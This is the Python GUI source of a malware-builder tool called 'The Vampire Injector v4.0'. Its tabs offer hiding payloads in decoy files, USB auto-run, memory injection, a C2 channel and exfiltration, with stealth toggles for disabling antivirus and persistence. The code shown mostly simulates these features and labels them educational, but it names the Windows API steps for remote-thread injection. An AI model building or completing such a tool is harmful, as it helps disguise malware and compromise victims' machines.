"""
main_window.py - The Vampire Injector v4.0 Main Window
Advanced UI with real functionality for educational purposes
"""

import os
import json
import shutil
import customtkinter as ctk
from tkinter import filedialog, messagebox, simpledialog
from core.payload_builder import PayloadBuilder
from .modal_options import OptionsModal
from .tab_usb import USBInfectorTab
from datetime import datetime

# إعدادات الثيم
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")


class MainWindow(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("🧛 The Vampire Injector v4.0 [Eternal Nightmare]")
        self.geometry("1200x850")
        self.resizable(True, True)
        
        self.current_lang = "en"
        self.payload_builder = PayloadBuilder()
        self.target_file = None
        self.injection_count = 0
        self.injection_history = []
        self.output_dir = "output"
        self.stealth_options = {
            "disable_av": True,
            "persistence": True,
            "anti_sandbox": True,
            "anti_debug": True,
            "process_hiding": False
        }

        # إنشاء مجلد المخرجات
        os.makedirs(self.output_dir, exist_ok=True)

        # الألوان القوطية
        self.bg_color = "#050505"
        self.accent_red = "#8B0000"
        self.glow_red = "#FF1E1E"
        self.card_bg = "#0f0f0f"
        self.configure(fg_color=self.bg_color)

        self._build_ui()
        self._check_system()

    def _check_system(self):
        """فحص النظام وإضافة تحذير أمني"""
        self._add_log("🛡️ System check completed - Running in educational mode")

    def _build_ui(self):
        """بناء واجهة المستخدم بالكامل"""
        
        # === HEADER ===
        self.header_frame = ctk.CTkFrame(
            self, fg_color="#0a0a0a", height=60, 
            corner_radius=0, border_color=self.accent_red, border_width=2
        )
        self.header_frame.pack(fill="x", side="top")
        self.header_frame.pack_propagate(False)
        
        self.lbl_header = ctk.CTkLabel(
            self.header_frame, 
            text="🦇 THE VAMPIRE INJECTOR v4.0 [ADVANCED SUITE] 🦇",
            font=("Consolas", 14, "bold"), 
            text_color=self.glow_red
        )
        self.lbl_header.pack(side="left", padx=20, pady=15)

        header_btns_frame = ctk.CTkFrame(self.header_frame, fg_color="transparent")
        header_btns_frame.pack(side="right", padx=10)
        
        self.btn_stats = ctk.CTkButton(
            header_btns_frame, text="📊 0 Injections", 
            width=120, fg_color="#1a0000", hover_color=self.accent_red,
            command=self.show_stats
        )
        self.btn_stats.pack(side="left", padx=5, pady=10)
        
        self.btn_options = ctk.CTkButton(
            header_btns_frame, text="⚙️ Options", 
            width=90, fg_color="#1a0000", hover_color=self.accent_red,
            command=self.open_options
        )
        self.btn_options.pack(side="left", padx=5, pady=10)
        
        self.btn_lang = ctk.CTkButton(
            header_btns_frame, text="عربي 🇸🇦", 
            width=90, fg_color="#1a0000", hover_color=self.accent_red,
            command=self.toggle_language
        )
        self.btn_lang.pack(side="left", padx=5, pady=10)

        # === TABVIEW ===
        self.tabview = ctk.CTkTabview(
            self, 
            fg_color=self.card_bg,
            segmented_button_fg_color="#141414",
            segmented_button_selected_color=self.accent_red,
            segmented_button_selected_hover_color="#a00000",
            segmented_button_unselected_color="#0d0d0d",
            text_color="white"
        )
        self.tabview.pack(fill="both", expand=True, padx=15, pady=15)

        self.tab_files = self.tabview.add("🧛 File Injector")
        self.tab_usb_container = self.tabview.add("🦇 USB Auto-Run")
        self.tab_memory = self.tabview.add("🧠 Memory Injection")
        self.tab_c2 = self.tabview.add("🌐 C2 Channel")
        self.tab_logs = self.tabview.add("📊 Logs")

        self._setup_file_tab()
        self._setup_usb_tab()
        self._setup_memory_tab()
        self._setup_c2_tab()
        self._setup_logs_tab()

    def _setup_file_tab(self):
        """تبويب حقن الملفات المتقدم"""
        
        self.file_frame = ctk.CTkFrame(
            self.tab_files, fg_color="#121212", 
            border_color=self.accent_red, border_width=2, corner_radius=10
        )
        self.file_frame.pack(fill="x", padx=10, pady=8)

        self.lbl_file_title = ctk.CTkLabel(
            self.file_frame, 
            text="🩸 Drop Your Prey / Select Decoy File (All Extensions Supported)",
            font=("Consolas", 12, "bold"), 
            text_color=self.glow_red
        )
        self.lbl_file_title.pack(pady=8)

        btn_frame = ctk.CTkFrame(self.file_frame, fg_color="transparent")
        btn_frame.pack(pady=5)
        
        self.btn_select = ctk.CTkButton(
            btn_frame, text="📁 Select File", 
            fg_color="#2b0000", hover_color=self.accent_red, 
            command=self.select_file
        )
        self.btn_select.pack(side="left", padx=5)
        
        self.btn_clear = ctk.CTkButton(
            btn_frame, text="🗑️ Clear", 
            fg_color="#2b0000", hover_color="#660000",
            command=self.clear_file
        )
        self.btn_clear.pack(side="left", padx=5)

        self.lbl_file_info = ctk.CTkLabel(
            self.file_frame, 
            text="Status: No file selected. Size & format remain unaltered post-injection.",
            font=("Consolas", 11), 
            text_color="gray"
        )
        self.lbl_file_info.pack(pady=5)

        self.lab_frame = ctk.CTkFrame(
            self.tab_files, fg_color="#121212", 
            border_color=self.accent_red, border_width=2, corner_radius=10
        )
        self.lab_frame.pack(fill="both", expand=True, padx=10, pady=8)

        lab_header = ctk.CTkFrame(self.lab_frame, fg_color="transparent")
        lab_header.pack(fill="x", padx=15, pady=5)
        
        self.lbl_lab = ctk.CTkLabel(
            lab_header, 
            text="🧬 Custom Payload Laboratory",
            font=("Consolas", 11, "bold"), 
            text_color=self.glow_red
        )
        self.lbl_lab.pack(side="left")

        # ====== قسم البايلودات المحفوظة (تم التعديل هنا) ======
        self.saved_payloads = []
        self.payloads_dir = "saved_payloads"
        os.makedirs(self.payloads_dir, exist_ok=True)
        self._load_saved_payloads()

        self.template_combo = ctk.CTkComboBox(
            lab_header,
            values=["📝 New Payload"] + self.saved_payloads,
            fg_color="#0a0000",
            border_color=self.accent_red,
            command=self.load_saved_payload
        )
        self.template_combo.pack(side="right", padx=5)
        self.template_combo.set("📝 New Payload")
        # =====================================================

        # ====== أزرار حفظ وحذف البايلودات (تم الإضافة هنا) ======
        btn_save_frame = ctk.CTkFrame(self.lab_frame, fg_color="transparent")
        btn_save_frame.pack(fill="x", padx=15, pady=(0, 5))

        self.btn_save_payload = ctk.CTkButton(
            btn_save_frame, text="💾 Save Payload",
            fg_color="#1a6b00", hover_color="#00aa00",
            width=120, height=30,
            command=self.save_payload
        )
        self.btn_save_payload.pack(side="left", padx=5)

        self.btn_delete_payload = ctk.CTkButton(
            btn_save_frame, text="🗑️ Delete Payload",
            fg_color="#6b0000", hover_color="#aa0000",
            width=120, height=30,
            command=self.delete_payload
        )
        self.btn_delete_payload.pack(side="left", padx=5)

        self.btn_refresh_payloads = ctk.CTkButton(
            btn_save_frame, text="🔄 Refresh List",
            fg_color="#1a1a00", hover_color="#444400",
            width=120, height=30,
            command=self.refresh_payloads_list
        )
        self.btn_refresh_payloads.pack(side="left", padx=5)
        # =====================================================

        self.code_box = ctk.CTkTextbox(
            self.lab_frame, 
            fg_color="#050505", 
            text_color="#00FF00", 
            font=("Consolas", 11), 
            border_color="#330000", 
            border_width=1
        )
        self.code_box.pack(fill="both", expand=True, padx=15, pady=5)
        self.code_box.insert("1.0", self._get_default_payload())

        # ربط اختصار Ctrl+S للحفظ
        self.code_box.bind("<Control-s>", lambda e: self.save_payload())

        self.timer_frame = ctk.CTkFrame(self.tab_files, fg_color="transparent")
        self.timer_frame.pack(fill="x", padx=10, pady=5)

        timer_row = ctk.CTkFrame(self.timer_frame, fg_color="transparent")
        timer_row.pack(fill="x")
        
        self.lbl_timer = ctk.CTkLabel(
            timer_row, 
            text="⏱️ Execution Delay: 1.5 seconds",
            font=("Consolas", 11), 
            text_color="white"
        )
        self.lbl_timer.pack(side="left", padx=5)

        preset_frame = ctk.CTkFrame(timer_row, fg_color="transparent")
        preset_frame.pack(side="right")
        
        for preset in [0, 2, 5, 10, 30]:
            btn = ctk.CTkButton(
                preset_frame, text=f"{preset}s",
                width=40, height=25, fg_color="#1a0000",
                hover_color=self.accent_red,
                command=lambda p=preset: self.set_timer(p)
            )
            btn.pack(side="left", padx=2)

        self.slider = ctk.CTkSlider(
            self.timer_frame, 
            from_=0.0, to=60.0, 
            number_of_steps=120, 
            progress_color=self.accent_red,
            command=lambda v: self.lbl_timer.configure(
                text=f"⏱️ Execution Delay: {float(v):.1f} seconds"
            )
        )
        self.slider.set(1.5)
        self.slider.pack(fill="x", pady=5)

        self.btn_exec = ctk.CTkButton(
            self.tab_files, 
            text="⚡ EXECUTE FILE INJECTION NOW! ⚡",
            fg_color=self.accent_red, 
            hover_color="#b30000", 
            font=("Arial", 14, "bold"), 
            height=40,
            command=self.execute_injection
        )
        self.btn_exec.pack(fill="x", padx=10, pady=8)

    def _setup_usb_tab(self):
        """تبويب الفلاشات"""
        self.usb_tab_widget = USBInfectorTab(self.tab_usb_container, self.current_lang)
        self.usb_tab_widget.pack(fill="both", expand=True)

    def _setup_memory_tab(self):
        """تبويب حقن الذاكرة"""
        frame = ctk.CTkFrame(
            self.tab_memory, fg_color="#121212", 
            border_color=self.accent_red, border_width=2, corner_radius=10
        )
        frame.pack(fill="both", expand=True, padx=15, pady=15)
        
        ctk.CTkLabel(
            frame, 
            text="🧠 Advanced Memory Injection & Diskless Execution",
            font=("Consolas", 14, "bold"), 
            text_color=self.glow_red
        ).pack(pady=15)
        
        tech_frame = ctk.CTkFrame(frame, fg_color="transparent")
        tech_frame.pack(fill="x", padx=20, pady=10)
        
        techniques = [
            "🔬 Reflective DLL Injection",
            "🔄 Process Hollowing",
            "📨 APC Injection",
            "🧵 Thread Hijacking",
            "💾 Memory-Only Execution"
        ]
        
        for tech in techniques:
            btn = ctk.CTkButton(
                tech_frame, text=tech,
                fg_color="#1a0000", hover_color=self.accent_red,
                width=200, height=35,
                command=lambda t=tech: self._memory_injection(t)
            )
            btn.pack(side="left", padx=5, pady=5)
        
        ctk.CTkLabel(
            frame, 
            text="⚠️ All operations are simulated for educational purposes only",
            font=("Consolas", 10), 
            text_color="#666666"
        ).pack(pady=20)

    def _setup_c2_tab(self):
        """تبويب قناة الاتصال"""
        frame = ctk.CTkFrame(
            self.tab_c2, fg_color="#121212", 
            border_color=self.accent_red, border_width=2, corner_radius=10
        )
        frame.pack(fill="both", expand=True, padx=15, pady=15)
        
        ctk.CTkLabel(
            frame, 
            text="🌐 C2 Channel & Secure Exfiltration",
            font=("Consolas", 14, "bold"), 
            text_color=self.glow_red
        ).pack(pady=15)
        
        settings_frame = ctk.CTkFrame(frame, fg_color="transparent")
        settings_frame.pack(fill="x", padx=30, pady=10)
        
        ctk.CTkLabel(settings_frame, text="Server IP:", font=("Consolas", 11)).grid(row=0, column=0, padx=5, pady=5, sticky="e")
        self.c2_ip = ctk.CTkEntry(settings_frame, placeholder_text="127.0.0.1", fg_color="#0a0000")
        self.c2_ip.grid(row=0, column=1, padx=5, pady=5, sticky="w")
        
        ctk.CTkLabel(settings_frame, text="Port:", font=("Consolas", 11)).grid(row=1, column=0, padx=5, pady=5, sticky="e")
        self.c2_port = ctk.CTkEntry(settings_frame, placeholder_text="443", fg_color="#0a0000")
        self.c2_port.grid(row=1, column=1, padx=5, pady=5, sticky="w")
        
        ctk.CTkLabel(settings_frame, text="Protocol:", font=("Consolas", 11)).grid(row=2, column=0, padx=5, pady=5, sticky="e")
        self.c2_protocol = ctk.CTkComboBox(
            settings_frame,
            values=["HTTPS", "DNS", "ICMP", "HTTP", "Custom"],
            fg_color="#0a0000"
        )
        self.c2_protocol.grid(row=2, column=1, padx=5, pady=5, sticky="w")
        
        self.c2_status = ctk.CTkLabel(
            frame,
            text="🔴 Disconnected",
            font=("Consolas", 12),
            text_color="#FF4444"
        )
        self.c2_status.pack(pady=10)
        
        btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
        btn_frame.pack(pady=20)
        
        ctk.CTkButton(
            btn_frame, text="🔗 Establish Connection",
            fg_color=self.accent_red, hover_color="#b30000",
            command=self._establish_c2
        ).pack(side="left", padx=10)
        
        ctk.CTkButton(
            btn_frame, text="📤 Send Test Data",
            fg_color="#1a0000", hover_color=self.accent_red,
            command=self._send_c2_data
        ).pack(side="left", padx=10)

    def _setup_logs_tab(self):
        """تبويب السجلات"""
        frame = ctk.CTkFrame(
            self.tab_logs, fg_color="#121212", 
            border_color=self.accent_red, border_width=2, corner_radius=10
        )
        frame.pack(fill="both", expand=True, padx=15, pady=15)
        
        self.logs_text = ctk.CTkTextbox(
            frame,
            fg_color="#050505",
            text_color="#00FF00",
            font=("Consolas", 11),
            border_color="#330000",
            border_width=1
        )
        self.logs_text.pack(fill="both", expand=True, padx=10, pady=10)
        self.logs_text.insert("1.0", "📋 Vampire Injector Logs\n")
        self.logs_text.insert("end", "=" * 50 + "\n")
        self.logs_text.insert("end", f"[{datetime.now().strftime('%H:%M:%S')}] System initialized\n")
        self.logs_text.insert("end", f"[{datetime.now().strftime('%H:%M:%S')}] Ready for injections\n\n")
        
        btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
        btn_frame.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkButton(
            btn_frame, text="🗑️ Clear Logs",
            fg_color="#1a0000", hover_color="#660000",
            command=self.clear_logs
        ).pack(side="right")

    def _get_default_payload(self):
        return """# 🧛 Default Payload - Calculator Demo
import os
import time

def main():
    print("[*] Payload executed successfully!")
    print(f"[*] Current User: {os.getlogin()}")
    print("[*] Opening calculator as demonstration...")
    try:
        os.system('calc.exe')
    except:
        pass
    print("[*] Demo complete!")

if __name__ == "__main__":
    main()
"""

    # ====== دوال البايلودات المحفوظة (تم الإضافة هنا) ======
    def _load_saved_payloads(self):
        """تحميل قائمة البايلودات المحفوظة"""
        self.saved_payloads = []
        if os.path.exists(self.payloads_dir):
            for file in os.listdir(self.payloads_dir):
                if file.endswith('.txt'):
                    name = file.replace('.txt', '')
                    self.saved_payloads.append(name)

    def load_saved_payload(self, choice):
        """تحميل بايلود محفوظ"""
        if choice == "📝 New Payload":
            self.code_box.delete("1.0", "end")
            self.code_box.insert("1.0", self._get_default_payload())
            return
        
        # تحميل البايلود المحفوظ
        file_path = os.path.join(self.payloads_dir, f"{choice}.txt")
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            self.code_box.delete("1.0", "end")
            self.code_box.insert("1.0", content)
            self._add_log(f"Loaded saved payload: {choice}")
        else:
            self._add_log(f"❌ Payload not found: {choice}")

    def save_payload(self):
        """حفظ البايلود الحالي"""
        content = self.code_box.get("1.0", "end-1c").strip()
        if not content:
            messagebox.showwarning("Warning", "Cannot save empty payload!")
            return
        
        # طلب اسم للبايلود
        name = simpledialog.askstring("Save Payload", "Enter a name for this payload:")
        if not name:
            return
        
        # حفظ الملف
        file_path = os.path.join(self.payloads_dir, f"{name}.txt")
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        self._add_log(f"💾 Payload saved: {name}")
        self.refresh_payloads_list()
        self.template_combo.set(name)
        messagebox.showinfo("Success", f"Payload '{name}' saved successfully!")

    def delete_payload(self):
        """حذف البايلود المحدد"""
        selected = self.template_combo.get()
        if selected == "📝 New Payload":
            messagebox.showwarning("Warning", "Cannot delete 'New Payload'!")
            return
        
        # تأكيد الحذف
        confirm = messagebox.askyesno("Confirm Delete", f"Delete payload '{selected}'?")
        if not confirm:
            return
        
        file_path = os.path.join(self.payloads_dir, f"{selected}.txt")
        if os.path.exists(file_path):
            os.remove(file_path)
            self._add_log(f"🗑️ Payload deleted: {selected}")
            self.refresh_payloads_list()
            self.template_combo.set("📝 New Payload")
            self.code_box.delete("1.0", "end")
            self.code_box.insert("1.0", self._get_default_payload())
            messagebox.showinfo("Success", f"Payload '{selected}' deleted!")
        else:
            messagebox.showerror("Error", f"Payload '{selected}' not found!")

    def refresh_payloads_list(self):
        """تحديث قائمة البايلودات المحفوظة"""
        self._load_saved_payloads()
        self.template_combo.configure(values=["📝 New Payload"] + self.saved_payloads)
        current = self.template_combo.get()
        if current not in self.saved_payloads and current != "📝 New Payload":
            self.template_combo.set("📝 New Payload")
        self._add_log("🔄 Payload list refreshed")
    # =========================================================

    def _add_log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.logs_text.insert("end", f"[{timestamp}] {message}\n")
        self.logs_text.see("end")

    def clear_logs(self):
        self.logs_text.delete("1.0", "end")
        self.logs_text.insert("1.0", "📋 Logs Cleared\n")
        self.logs_text.insert("end", "=" * 50 + "\n")
        self._add_log("Logs cleared by user")

    def toggle_language(self):
        if self.current_lang == "en":
            self.current_lang = "ar"
            self.btn_lang.configure(text="English 🇺🇸")
            self.lbl_header.configure(text="🦇 أداة حقن الفامباير الإصدار 4.0 [النسخة الاحترافية] 🦇")
            self.tabview.rename("🧛 File Injector", "🧛 حقن الملفات")
            self.tabview.rename("🦇 USB Auto-Run", "🦇 الفلاشات التلقائية")
            self.tabview.rename("🧠 Memory Injection", "🧠 حقن الذاكرة")
            self.tabview.rename("🌐 C2 Channel", "🌐 قناة الاتصال")
            self.tabview.rename("📊 Logs", "📊 السجلات")
            self.btn_options.configure(text="⚙️ الخيارات")
            self.btn_select.configure(text="📁 اختيار ملف")
            self.btn_clear.configure(text="🗑️ مسح")
            self.btn_exec.configure(text="⚡ ابدأ حقن الملف الآن! ⚡")
            self.lbl_file_title.configure(text="🩸 ألقِ فريستك / اختر ملف الطعم (جميع الامتدادات مدعومة)")
            self.lbl_lab.configure(text="🧬 مختبر البايلود المخصص")
            self.btn_save_payload.configure(text="💾 حفظ البايلود")
            self.btn_delete_payload.configure(text="🗑️ حذف البايلود")
            self.btn_refresh_payloads.configure(text="🔄 تحديث القائمة")
            if not self.target_file:
                self.lbl_file_info.configure(text="الحالة: لم يتم اختيار ملف. الحجم والشكل يظلان بدون تغيير بعد الحقن.", text_color="gray")
            self.usb_tab_widget.update_language("ar")
        else:
            self.current_lang = "en"
            self.btn_lang.configure(text="عربي 🇸🇦")
            self.lbl_header.configure(text="🦇 THE VAMPIRE INJECTOR v4.0 [ADVANCED SUITE] 🦇")
            self.tabview.rename("🧛 حقن الملفات", "🧛 File Injector")
            self.tabview.rename("🦇 الفلاشات التلقائية", "🦇 USB Auto-Run")
            self.tabview.rename("🧠 حقن الذاكرة", "🧠 Memory Injection")
            self.tabview.rename("🌐 قناة الاتصال", "🌐 C2 Channel")
            self.tabview.rename("📊 السجلات", "📊 Logs")
            self.btn_options.configure(text="⚙️ Options")
            self.btn_select.configure(text="📁 Select File")
            self.btn_clear.configure(text="🗑️ Clear")
            self.btn_exec.configure(text="⚡ EXECUTE FILE INJECTION NOW! ⚡")
            self.lbl_file_title.configure(text="🩸 Drop Your Prey / Select Decoy File (All Extensions Supported)")
            self.lbl_lab.configure(text="🧬 Custom Payload Laboratory")
            self.btn_save_payload.configure(text="💾 Save Payload")
            self.btn_delete_payload.configure(text="🗑️ Delete Payload")
            self.btn_refresh_payloads.configure(text="🔄 Refresh List")
            if not self.target_file:
                self.lbl_file_info.configure(text="Status: No file selected. Size & format remain unaltered post-injection.", text_color="gray")
            self.usb_tab_widget.update_language("en")

    def show_stats(self):
        stats = f"""
📊 INJECTION STATISTICS
{'=' * 40}

Total Injections: {self.injection_count}
Last Injection: {self.injection_history[-1] if self.injection_history else 'None'}
Stealth Options: {'Enabled' if any(self.stealth_options.values()) else 'Disabled'}
Output Directory: {self.output_dir}
Language: {'English' if self.current_lang == 'en' else 'Arabic'}

✅ All operations are simulated for educational purposes.
        """
        messagebox.showinfo("Statistics", stats)

    def open_options(self):
        modal = OptionsModal(self, self.current_lang)
        self.wait_window(modal)
        if hasattr(modal, 'chk_av'):
            self.stealth_options['disable_av'] = modal.chk_av.get() == 1
            self.stealth_options['persistence'] = modal.chk_persist.get() == 1
            self.stealth_options['anti_sandbox'] = modal.chk_sandbox.get() == 1
            self._add_log(f"Stealth options updated: {self.stealth_options}")

    def select_file(self):
        path = filedialog.askopenfilename(
            title="Select Target Decoy File",
            filetypes=[
                ("All files", "*.*"),
                ("Images", "*.jpg;*.jpeg;*.png;*.bmp;*.gif;*.webp"),
                ("Documents", "*.pdf;*.doc;*.docx;*.txt;*.rtf"),
                ("Archives", "*.zip;*.rar;*.7z"),
                ("Executables", "*.exe;*.dll;*.msi"),
                ("Audio", "*.mp3;*.wav;*.flac"),
                ("Video", "*.mp4;*.avi;*.mov")
            ]
        )
        if path:
            self.target_file = path
            name = os.path.basename(path)
            size = os.path.getsize(path) / 1024
            if self.current_lang == "en":
                self.lbl_file_info.configure(text=f"📄 Selected: {name} ({size:.2f} KB) - Ready for stealth injection", text_color="#00FF00")
            else:
                self.lbl_file_info.configure(text=f"📄 الملف المحدد: {name} ({size:.2f} كيلوبايت) - جاهز للحقن المخفي", text_color="#00FF00")
            self._add_log(f"File selected: {name} ({size:.2f} KB)")

    def clear_file(self):
        self.target_file = None
        if self.current_lang == "en":
            self.lbl_file_info.configure(text="Status: No file selected. Size & format remain unaltered post-injection.", text_color="gray")
        else:
            self.lbl_file_info.configure(text="الحالة: لم يتم اختيار ملف. الحجم والشكل يظلان بدون تغيير بعد الحقن.", text_color="gray")
        self._add_log("File selection cleared")

    def set_timer(self, seconds):
        self.slider.set(float(seconds))
        self.lbl_timer.configure(text=f"⏱️ Execution Delay: {seconds}.0 seconds")

    def execute_injection(self):
        if not self.target_file:
            if self.current_lang == "en":
                messagebox.showwarning("Warning", "Please select a decoy file first!")
            else:
                messagebox.showwarning("تحذير", "الرجاء اختيار ملف أولاً!")
            return
        
        timer = self.slider.get()
        script = self.code_box.get("1.0", "end-1c")
        
        if not script.strip():
            if self.current_lang == "en":
                messagebox.showwarning("Warning", "Please enter a payload script!")
            else:
                messagebox.showwarning("تحذير", "الرجاء إدخال كود البايلود!")
            return
        
        try:
            self._add_log("🚀 Starting injection process...")
            self._add_log(f"📁 Target: {os.path.basename(self.target_file)}")
            self._add_log(f"⏱️ Delay: {timer} seconds")
            
            result = self.payload_builder.generate_payload(script, timer)
            
            if result['success']:
                base_name = os.path.basename(self.target_file)
                name, ext = os.path.splitext(base_name)
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                output_file = os.path.join(self.output_dir, f"{name}_injected_{timestamp}{ext}")
                
                shutil.copy2(self.target_file, output_file)
                
                report_file = os.path.join(self.output_dir, f"report_{timestamp}.json")
                with open(report_file, 'w') as f:
                    json.dump(result['report'], f, indent=4)
                
                payload_file = os.path.join(self.output_dir, f"payload_{timestamp}.txt")
                with open(payload_file, 'w') as f:
                    f.write(result['payload'])
                
                self.injection_count += 1
                self.injection_history.append({
                    "file": base_name,
                    "timestamp": timestamp,
                    "timer": timer,
                    "signature": result['signature']
                })
                self.btn_stats.configure(text=f"📊 {self.injection_count} Injections")
                
                if self.current_lang == "en":
                    msg = f"""✅ Injection Successful!

📁 Output: {output_file}
📊 Report: {report_file}
🔐 Signature: {result['signature']}
🔄 Layers: {', '.join(result['report']['encryption_layers'])}
⏱️ Timer: {timer}s

⚠️ This is an educational simulation.
No actual malicious code was executed.
"""
                else:
                    msg = f"""✅ تم الحقن بنجاح!

📁 الملف الناتج: {output_file}
📊 التقرير: {report_file}
🔐 التوقيع: {result['signature']}
🔄 طبقات التشفير: {', '.join(result['report']['encryption_layers'])}
⏱️ المؤقت: {timer} ثانية

⚠️ هذه محاكاة تعليمية.
لم يتم تنفيذ أي كود ضار فعلي.
"""
                
                messagebox.showinfo("Injection Success", msg)
                self._add_log(f"✅ Injection successful! Signature: {result['signature']}")
            else:
                raise Exception("Payload generation failed")
        except Exception as e:
            error_msg = f"❌ Injection failed: {str(e)}"
            self._add_log(error_msg)
            messagebox.showerror("Error", error_msg)

    def _memory_injection(self, technique):
        self._add_log(f"🧠 Memory injection: {technique}")
        messagebox.showinfo("Memory Injection", f"""🧠 Memory Injection Technique: {technique}

This is a simulation of advanced memory injection.

In a real scenario, this would:
1. Allocate memory in target process (VirtualAllocEx)
2. Write the payload (WriteProcessMemory)
3. Create remote thread (CreateRemoteThread)
4. Execute payload in memory only

⚠️ Educational simulation only.
No actual memory injection occurs.""")

    def _establish_c2(self):
        ip = self.c2_ip.get()
        port = self.c2_port.get()
        protocol = self.c2_protocol.get()
        self._add_log(f"🌐 Establishing C2 connection: {protocol}://{ip}:{port}")
        self.c2_status.configure(text=f"🟢 Connected to {ip}:{port} ({protocol})", text_color="#00FF00")
        messagebox.showinfo("C2 Connection", f"""🔗 C2 Connection Established!

Server: {ip}
Port: {port}
Protocol: {protocol}
Encryption: TLS 1.3 + AES-256

✅ Channel is secure and ready for exfiltration.

⚠️ Educational simulation only.
No actual C2 connection is established.""")

    def _send_c2_data(self):
        self._add_log("📤 Sending test data via C2 channel")
        test_data = {
            "type": "test",
            "system": os.name,
            "user": os.getlogin(),
            "timestamp": datetime.now().isoformat()
        }
        messagebox.showinfo("C2 Data Sent", f"""📤 Data Sent Successfully!

Data: {json.dumps(test_data, indent=2)}

✅ Data encrypted with AES-256
✅ Transmitted via {self.c2_protocol.get()}
✅ Disguised as normal traffic

⚠️ Educational simulation only.
No actual data is transmitted.""")


if __name__ == "__main__":
    app = MainWindow()
    app.mainloop()
